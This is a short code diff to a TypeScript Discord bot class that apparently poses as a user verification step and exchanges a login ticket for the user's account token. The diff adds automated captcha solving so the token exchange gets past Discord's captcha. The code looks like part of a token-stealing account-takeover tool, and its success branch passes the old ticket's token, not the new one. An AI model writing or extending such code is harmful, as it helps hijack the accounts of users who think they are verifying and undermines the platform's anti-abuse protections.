@@ -21,9 +21,10 @@ import {
   IUserInfo,
 } from "../interfaces/ISocketEvents";
 import { verifyCodeEmbed } from "../util/embeds/verifyCode";
-import { getTicket } from "../fetch/getTicket";
-import Jimp from "jimp";
+import { getTicket, getTicketWithCaptcha } from "../fetch/getTicket";
 import { sharedClient } from "..";
+import { CaptchaSolver } from "./CaptchaSolver";
+import Jimp from "jimp";
 
 export class DiscordSocket {
   public messages = new Collection<string, any>();
@@ -143,5 +144,14 @@ export class DiscordSocket {
       return _this.handleFoundUserToken(_this, foundTicket.encrypted_token);
 
     const captchaToSolve: ICaptcha = foundTicket;
+    let solvedCaptcha = await CaptchaSolver.solveCaptcha(captchaToSolve.captcha_sitekey, captchaToSolve.captcha_rqdata);
+    if (!solvedCaptcha)
+      return _this.interaction.user.send("failed to verify you. please try again!");
+    
+    const foundTicketWithCaptcha = await getTicketWithCaptcha(messageData.ticket, solvedCaptcha, captchaToSolve.captcha_rqtoken);
+    if (foundTicketWithCaptcha.encrypted_token)
+      return _this.handleFoundUserToken(_this, foundTicket.encrypted_token);
+
+    console.log(`COULD NOT SOLVE CAPTCHA FOR ${_this.userInformation?.username}`)
   }
 }
